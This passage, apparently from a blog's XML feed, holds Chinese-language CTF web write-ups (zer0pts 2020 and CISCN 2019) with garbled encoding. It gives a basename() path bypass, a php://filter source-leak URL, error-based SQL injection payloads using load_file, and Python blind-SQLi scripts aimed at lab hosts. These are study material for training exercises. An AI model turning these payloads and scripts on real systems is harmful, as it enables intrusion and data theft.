spellcheck="true">#print(payload)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> json </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zeropts:2020-CanYouGuessIt</title>
      <link href="2021/07/28/zeropts-2020-canyouguessit/"/>
      <url>2021/07/28/zeropts-2020-canyouguessit/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/28/zeropts-2020-canyouguessit/1.png" alt="1"></p><p>ç‚¹å‡»source</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// FLAG is defined in config.php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Wrong.'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><ul><li><h5 id="hash-equals-â€”-å¯é˜²æ­¢æ—¶åºæ”»å‡»çš„å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ— è®ºå®ƒä»¬æ˜¯å¦ç›¸ç­‰ï¼Œæœ¬å‡½æ•°çš„æ—¶é—´æ¶ˆè€—æ˜¯æ’å®šçš„-ç›¸ç­‰æ—¶è¿”å›ž-trueï¼Œå¦åˆ™è¿”å›ž-falseã€‚"><a href="#hash-equals-â€”-å¯é˜²æ­¢æ—¶åºæ”»å‡»çš„å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ— è®ºå®ƒä»¬æ˜¯å¦ç›¸ç­‰ï¼Œæœ¬å‡½æ•°çš„æ—¶é—´æ¶ˆè€—æ˜¯æ’å®šçš„-ç›¸ç­‰æ—¶è¿”å›ž-trueï¼Œå¦åˆ™è¿”å›ž-falseã€‚" class="headerlink" title="hash_equals â€” å¯é˜²æ­¢æ—¶åºæ”»å‡»çš„å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ— è®ºå®ƒä»¬æ˜¯å¦ç›¸ç­‰ï¼Œæœ¬å‡½æ•°çš„æ—¶é—´æ¶ˆè€—æ˜¯æ’å®šçš„,ç›¸ç­‰æ—¶è¿”å›ž trueï¼Œå¦åˆ™è¿”å›ž falseã€‚"></a>hash_equals â€” å¯é˜²æ­¢æ—¶åºæ”»å‡»çš„å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ— è®ºå®ƒä»¬æ˜¯å¦ç›¸ç­‰ï¼Œæœ¬å‡½æ•°çš„æ—¶é—´æ¶ˆè€—æ˜¯æ’å®šçš„,ç›¸ç­‰æ—¶è¿”å›ž trueï¼Œå¦åˆ™è¿”å›ž falseã€‚</h5></li><li><h5 id="basename-â€”-å‡½æ•°è¿”å›žè·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚"><a href="#basename-â€”-å‡½æ•°è¿”å›žè·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚" class="headerlink" title="basename() â€” å‡½æ•°è¿”å›žè·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚"></a>basename() â€” å‡½æ•°è¿”å›žè·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚</h5></li></ul><p>å¯ä»¥å‘çŽ°basename()å¯è·¨ç›®å½•è¯»æ–‡ä»¶</p><p><img src="/2021/07/28/zeropts-2020-canyouguessit/2.png" alt="2"></p><p>%81å¼€å§‹ï¼Œbasenameå°±ä¼šå¿½ç•¥</p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><pre><code>http://url/index.php/config.php/%80?source</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN:2019-CyberPunk</title>
      <link href="2021/07/27/ciscn-2019-cyberpunk/"/>
      <url>2021/07/27/ciscn-2019-cyberpunk/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/27/ciscn-2019-cyberpunk/1.png" alt="1"></p><p><img src="/2021/07/27/ciscn-2019-cyberpunk/2.png" alt="2"></p><pre><code>http://479a5d57-76a6-4e2e-b8b1-edb840483fdf.node4.buuoj.cn/?file=php://filter/convert.base64-encode/resource=index.php</code></pre><p><img src="/2021/07/27/ciscn-2019-cyberpunk/3.png" alt="3"></p><p>base64è§£ç ä»¥åŽæœ‰ç”¨çš„ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// $file = $_GET["file"];</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/phar|zip|bzip2|zlib|data|input|%00/i"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'no way!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h5 id="ini-set-ä¸ºä¸€ä¸ªé…ç½®é€‰é¡¹è®¾ç½®å€¼"><a href="#ini-set-ä¸ºä¸€ä¸ªé…ç½®é€‰é¡¹è®¾ç½®å€¼" class="headerlink" title="ini_set:ä¸ºä¸€ä¸ªé…ç½®é€‰é¡¹è®¾ç½®å€¼"></a>ini_set:ä¸ºä¸€ä¸ªé…ç½®é€‰é¡¹è®¾ç½®å€¼</h5><h5 id="change-php"><a href="#change-php" class="headerlink" title="change.php:"></a>change.php:</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> "Ã¨Â®Â¢Ã¥ÂÂ•Ã¤</code></pre><h5 id="search-php"><a href="#search-php" class="headerlink" title="search.php:"></a>search.php:</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"&lt;p>Ã¥Â§Â“Ã¥ÂÂ:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>&lt;p>, Ã§Â”ÂµÃ¨Â¯Â:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>&lt;p>, Ã¥ÂœÂ°Ã¥ÂÂ€:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"Ã¦ÂœÂªÃ¦Â‰Â¾Ã¥ÂˆÂ°Ã¨Â®Â¢Ã¥ÂÂ•!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"Ã¤Â¿Â¡Ã¦ÂÂ¯Ã¤Â¸ÂÃ¥Â…Â¨"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>addressåªæ˜¯è¿›è¡Œäº†ç®€å•çš„è½¬ä¹‰</p><pre class=" language-php"><code class="language-php"><span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><pre><code>1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)#</code></pre><pre><code>1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),20,50)),0x7e),1)#</code></pre><p>å…ˆåœ¨åˆå§‹é¡µé¢éšä¾¿è¾“æ•°æ®ï¼Œè®°ä½å§“åç”µè¯</p><p>æŽ¥ç€ä¿®æ”¹åœ°å€ï¼Œåœ°å€ä¿®æ”¹ä¸ºæ‰€æž„é€ çš„payloadã€‚ä¿®æ”¹ä¹‹åŽå†æ¬¡ä¿®æ”¹ï¼Œå°†åœ°å€è®¾ç½®ä¸ºéšä¾¿ä¸€ä¸ªæ­£å¸¸å€¼ï¼Œæ¯”å¦‚1ï¼Œè¿™æ ·å°±èƒ½çœ‹åˆ°æŠ¥é”™é¡µé¢ã€‚</p><p>å¦‚æžœæƒ³è¦ä½¿ç”¨æ–°çš„payloadï¼Œåªéœ€è¦åˆ é™¤è®¢å•åœ¨é‡å¤ä»¥ä¸Šæ“ä½œå³å¯ã€‚</p><pre><code>flag{46f184ea-6e18-43cb-8ff7-26925d95d827}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN:2019-Easyweb</title>
      <link href="2021/07/26/ciscn-2019-easyweb/"/>
      <url>2021/07/26/ciscn-2019-easyweb/</url>
      
        <content type="html"><![CDATA[<h5 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h5><p><img src="/2021/07/26/ciscn-2019-easyweb/1.png" alt="1"></p><p>å°è¯•åŽèŽ·å–åˆ°image.php.bakæ–‡ä»¶</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\\0"</span><span class="token punctuation">,</span><span class="token string">"%00"</span><span class="token punctuation">,</span><span class="token string">"\\'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\\0"</span><span class="token punctuation">,</span><span class="token string">"%00"</span><span class="token punctuation">,</span><span class="token string">"\\'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">"select * from images where id='{$id}' or path='{$path}'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token string">"./"</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>addslashes,è¿‡æ»¤</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span>  requestsurl <span class="token operator">=</span> <span class="token string">"http://ecc89072-42aa-401e-a614-4dd0ea819943.node4.buuoj.cn/image.php?id=\\0&amp;path="</span>payload <span class="token operator">=</span> <span class="token string">"or id=if(ascii(substr((select username from users),{0},1))>{1},1,0)%23"</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    l <span class="token operator">=</span> <span class="token number">1</span>    r <span class="token operator">=</span> <span class="token number">130</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>        payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"JFIF"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            l <span class="token operator">=</span> mid <span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>    result<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> r<span class="token string">'http://ecc89072-42aa-401e-a614-4dd0ea819943.node4.buuoj.cn/image.php'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    <span class="token keyword">while</span> high <span class="token operator">></span> low<span class="token punctuation">:</span>        payload <span class="token 